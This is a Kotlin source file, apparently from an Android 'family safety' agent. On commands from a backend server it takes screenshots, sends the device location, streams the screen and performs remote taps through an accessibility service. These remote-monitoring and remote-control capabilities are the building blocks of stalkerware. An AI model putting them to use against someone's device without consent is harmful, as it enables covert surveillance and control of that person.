package com.familysafety.agent

import android.content.Context
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

object SocketManager {
    private var socket: Socket? = null

    fun connect(context: Context) {
        if (socket?.connected() == true) return

        try {
            val options = IO.Options()
            options.query = "profileId=${Config.profileId}"
            
            socket = IO.socket(Config.backendUrl, options)
            
            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("SocketManager", "Connected to backend")
                registerDevice()
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("SocketManager", "Disconnected from backend")
            }

            // Real-time Command Listeners
            socket?.on("take_screenshot") {
                Log.d("SocketManager", "Command received: take_screenshot")
                ScreenshotHelper.takeScreenshot(context)
            }

            socket?.on("get_location") {
                Log.d("SocketManager", "Command received: get_location")
                LocationHelper.fetchAndSendLocation(context)
            }

            socket?.on("start_screen_stream") {
                Log.d("SocketManager", "Command received: start_screen_stream")
                val metrics = context.resources.displayMetrics
                ScreenStreamManager.startStreaming(
                    metrics.widthPixels,
                    metrics.heightPixels,
                    metrics.densityDpi
                )
            }

            socket?.on("stop_screen_stream") {
                Log.d("SocketManager", "Command received: stop_screen_stream")
                ScreenStreamManager.stop()
            }

            socket?.on("remote_click") { args ->
                try {
                    val data = args[0] as? org.json.JSONObject ?: return@on
                    val xPct = data.getDouble("x_percent").toFloat()
                    val yPct = data.getDouble("y_percent").toFloat()
                    SafetyAccessibilityService.instance?.performRemoteClick(xPct, yPct)
                        ?: Log.w("SocketManager", "SafetyAccessibilityService henüz bağlı değil")
                } catch (e: Exception) {
                    Log.e("SocketManager", "remote_click işlenemedi: ${e.message}")
                }
            }

            socket?.connect()
        } catch (e: URISyntaxException) {
            Log.e("SocketManager", "Socket connection error", e)
        }
    }

    private fun registerDevice() {
        val data = JSONObject()
        data.put("profileId", Config.profileId)
        data.put("model", android.os.Build.MODEL)
        data.put("manufacturer", android.os.Build.MANUFACTURER)
        data.put("os_version", android.os.Build.VERSION.RELEASE)
        socket?.emit("register", data)
    }

    fun disconnect() {
        socket?.disconnect()
        socket = null
    }

    fun emit(event: String, data: JSONObject) {
        socket?.emit(event, data)
    }
}
